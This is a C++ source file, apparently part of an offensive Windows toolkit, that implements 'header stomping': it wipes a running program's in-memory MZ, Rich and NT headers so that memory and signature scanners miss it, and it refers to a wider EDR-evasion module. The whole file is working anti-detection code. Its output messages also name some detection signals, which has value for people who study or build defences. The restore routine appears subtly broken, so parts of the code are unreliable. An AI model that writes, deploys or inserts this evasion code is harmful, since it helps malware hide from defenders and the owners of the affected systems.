#include "PEStamp.h"

static BYTE g_savedDosHeader[0x40] = {};
static BYTE g_savedNtSig[4]        = {};
static bool g_saved = false;

static PVOID GetBase() { return (PVOID)GetModuleHandleA(NULL); }

static bool Unprotect(PVOID addr, SIZE_T sz, DWORD* old) {
    return VirtualProtect(addr, sz, PAGE_READWRITE, old) != 0;
}
static void Reprotect(PVOID addr, SIZE_T sz, DWORD old) {
    DWORD tmp; VirtualProtect(addr, sz, old, &tmp);
}

std::string PEStamp::StompMZ() {
    BYTE* base = (BYTE*)GetBase();
    DWORD old; if (!Unprotect(base, 2, &old))
        return "PEStamp: VirtualProtect failed";

    if (!g_saved) { memcpy(g_savedDosHeader, base, 0x40); g_saved = true; }

    base[0] = 0x00; base[1] = 0x00;  // overwrite 'MZ'
    Reprotect(base, 2, old);
    return "PEStamp: MZ magic zeroed\n"
           "GetModuleHandle(NULL) still works (uses PEB), but signature-based\n"
           "scanners looking for 0x4D5A in the first two bytes will miss us.\n"
           "Detection: VirtualProtect on module base = Sysmon EID 10 anomaly.";
}

std::string PEStamp::StompFull() {
    BYTE* base = (BYTE*)GetBase();
    auto* dos  = (PIMAGE_DOS_HEADER)base;

    // Save before wiping
    if (!g_saved) {
        memcpy(g_savedDosHeader, base, sizeof(g_savedDosHeader));
        BYTE* ntHdr = base + dos->e_lfanew;
        memcpy(g_savedNtSig, ntHdr, 4);
        g_saved = true;
    }

    DWORD e_lfanew = dos->e_lfanew;
    DWORD wipeSize = e_lfanew + sizeof(IMAGE_NT_HEADERS);
    DWORD old;
    if (!Unprotect(base, wipeSize, &old))
        return "PEStamp: VirtualProtect failed (need RW on header page)";

    // Wipe everything from base to end of NT headers:
    // - DOS header (0x00..0x3F)
    // - DOS stub + Rich header (0x40..e_lfanew-1)  ← compiler fingerprint lives here
    // - NT signature + file header + optional header (e_lfanew..+sizeof NT_HEADERS)
    // The TimeDateStamp is inside FileHeader so it is also zeroed here.
    memset(base, 0, e_lfanew);
    memset(base + e_lfanew, 0, sizeof(IMAGE_NT_HEADERS));

    Reprotect(base, wipeSize, old);

    return "PEStamp: Full headers wiped (DOS stub + Rich header + NT headers zeroed)\n"
           "Rich header compiler fingerprint and PE TimeDateStamp are gone from memory.\n"
           "Memory scanners will find only zeroes — no MZ, PE\\0\\0, machine type or Rich.\n"
           "Detection: VirtualProtect(module_base) = EDR signal (mitigated by Evasion::RunAll).";
}

std::string PEStamp::RestoreHeaders() {
    if (!g_saved) return "PEStamp: nothing saved to restore";
    BYTE* base = (BYTE*)GetBase();
    DWORD old;
    if (!Unprotect(base, sizeof(g_savedDosHeader), &old))
        return "PEStamp: restore VirtualProtect failed";
    memcpy(base, g_savedDosHeader, sizeof(g_savedDosHeader));
    // Restore NT sig
    auto* dos = (PIMAGE_DOS_HEADER)base;
    BYTE* ntHdr = base + dos->e_lfanew;
    DWORD old2; Unprotect(ntHdr, 4, &old2);
    memcpy(ntHdr, g_savedNtSig, 4);
    Reprotect(ntHdr, 4, old2);
    Reprotect(base, sizeof(g_savedDosHeader), old);
    return "PEStamp: headers restored from saved copy";
}

std::string PEStamp::CheckHeaders() {
    BYTE* base = (BYTE*)GetBase();
    char buf[256];
    snprintf(buf, sizeof(buf),
        "PEStamp header check:\n"
        "  [0x00] e_magic:    %02X %02X (%s)\n"
        "  [0x3C] e_lfanew:   0x%08X\n"
        "  [+0x00] NT sig:    %02X %02X %02X %02X (%s)\n",
        base[0], base[1], (base[0]==0x4D && base[1]==0x5A) ? "MZ intact" : "STOMPED",
        ((PIMAGE_DOS_HEADER)base)->e_lfanew,
        base[((PIMAGE_DOS_HEADER)base)->e_lfanew+0],
        base[((PIMAGE_DOS_HEADER)base)->e_lfanew+1],
        base[((PIMAGE_DOS_HEADER)base)->e_lfanew+2],
        base[((PIMAGE_DOS_HEADER)base)->e_lfanew+3],
        (base[((PIMAGE_DOS_HEADER)base)->e_lfanew]=='P') ? "PE intact" : "STOMPED");
    return std::string(buf);
}
